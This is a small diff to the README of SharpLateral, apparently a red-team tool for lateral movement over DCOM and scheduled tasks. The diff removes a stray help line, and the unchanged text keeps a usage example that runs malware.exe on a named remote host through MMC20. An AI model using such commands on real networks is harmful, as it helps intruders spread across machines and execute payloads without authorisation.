@@ -21,7 +21,6 @@ SharpLateral aims to perform lateral movement with the following methods:<br>
 - SCHEDULED TASKS
 
   <br>DCOM:<br>
-  ``RedPersist.exe --help``<br><br>
 ``SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe``<br>
 ````Executes Malware on given hostname via MMC20````
  <br>Scheduled Task:<br>
